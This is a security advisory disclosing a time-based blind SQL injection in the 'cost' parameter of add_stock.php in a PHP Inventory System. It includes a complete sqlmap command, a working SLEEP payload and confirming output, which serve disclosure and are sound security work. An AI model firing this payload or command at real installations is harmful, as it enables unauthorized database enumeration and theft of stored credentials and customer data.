# SQL Injection in Inventory System (Add Stock)

## Overview

* **Vulnerability Type**: SQL Injection (Time-based Blind)
* **Product**: [Inventory System](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
* **Version**: 1.0
* **Component**: Add Stock (`add_stock.php`)
* **Vulnerable Parameter**: `cost` (POST)

## Description

A SQL Injection vulnerability exists in the **Inventory System**. The vulnerability is located in the `add_stock.php` file.

The application fails to properly sanitize the `cost` parameter in the HTTP POST request (used when adding new stock items). This allows an authenticated attacker to inject arbitrary SQL commands. Since the backend database is **MySQL**, attackers can exploit this using **Time-based blind injection** techniques (e.g., `SLEEP()`) to enumerate database structures and exfiltrate sensitive data, even if the application does not return database errors or data directly.

## Steps to Reproduce

1. **Setup**: Deploy the Inventory System locally.
2. **Login**: Log in to the application.
3. **Navigate**: Go to the "Add Stock" page.
4. **Exploit**: Submit the form and capture the POST request. Inject the SQL payload into the `cost` parameter, or use `sqlmap`.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8089/add_stock.php" \
--data "stockid=SD57&name=TestProduct&cost=100&sell=150&supplier=TestSupplier&category=TestCategory&Submit=Add" \
--batch -v 6 --risk=3 \
--cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**Time-based Blind Payload (MySQL):**

```sql
stockid=SD57&name=TestProduct&cost=100 AND (SELECT 1772 FROM (SELECT(SLEEP(5)))wTBq)&sell=150&supplier=TestSupplier&category=TestCategory&Submit=Add

```

## Proof of Concept

The following output from `sqlmap` confirms that the `cost` parameter is vulnerable to Time-based SQL injection.

```text
Parameter: cost (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: stockid=SD57&name=TestProduct&cost=100 AND (SELECT 1772 FROM (SELECT(SLEEP(5)))wTBq)&sell=150&supplier=TestSupplier&category=TestCategory&Submit=Add
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
---
[INFO] the back-end DBMS is MySQL

```
<img width="1042" height="202" alt="图片" src="https://github.com/user-attachments/assets/e83b4c96-c080-4453-ab51-b6945f78c033" />



## Impact

This vulnerability allows an attacker to:

1. **Database Enumeration**: Identify tables, columns, and database schema via time-based inference.
2. **Data Exfiltration**: Retrieve sensitive information (credentials, customer data) bit-by-bit by measuring response times.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html

```
